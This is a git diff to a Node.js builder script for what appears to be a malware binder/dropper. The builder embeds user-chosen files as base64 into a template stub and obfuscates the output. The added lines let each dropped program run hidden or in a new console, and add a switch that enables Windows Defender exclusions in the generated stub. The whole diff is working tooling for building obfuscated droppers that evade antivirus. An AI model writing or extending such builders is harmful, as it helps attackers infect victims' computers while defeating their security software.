@@ -32,6 +32,15 @@ async function getCode() {
     }
 }
 
+async function replace_defender_exclusions(code, defender_exclusions) {
+    if (defender_exclusions) {
+        var to_replace = 'var exclusions = false;';
+        var new_code = 'var exclusions = true;';
+        code = code.replace(to_replace, new_code);
+    }
+    return code;
+}
+
 async function main() {
     var ammount_of_files = prompt("Enter the ammount of files you want to drop/bind: ");
 
@@ -43,16 +52,26 @@ async function main() {
     var processes = [];
     for (var i = 0; i < ammount_of_files; i++) {
         var file_location = prompt("Enter the file location: ");
+        var new_console = prompt("Do you want to run in a new console? (best if you have a console app and you want to keep the same console.) (y/n): ");
+        var hidden = prompt("Do you want to run the process hidden? (best to use with console off so it doesn't mess anything up) (y/n): ");
+
+        new_console = new_console == "y" ? true : false;
+        hidden = hidden == "y" ? true : false;
+
         var process_ext = file_location.split('.').pop();
         var process_code = fs.readFileSync(file_location, "base64");
-        processes.push({ process_ext, process_code });
+        processes.push({ process_ext, process_code, new_console, hidden });
     }
 
-    var to_replace = '[{process_ext:"key1", process_code:"BASE64DATA"}]';
+    var defender_exclusions = prompt("Do you want to add defender exclusions? (y/n): ");
+    defender_exclusions = defender_exclusions == "y" ? true : false;
+
+    var to_replace = '[{process_ext:"key1", process_code:"BASE64DATA", new_console: false, hidden: false}]';
 
     var code = await getCode();
 
     code = code.replace(to_replace, JSON.stringify(processes));
+    code = await replace_defender_exclusions(code, defender_exclusions);
 
     var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
         compact: true,
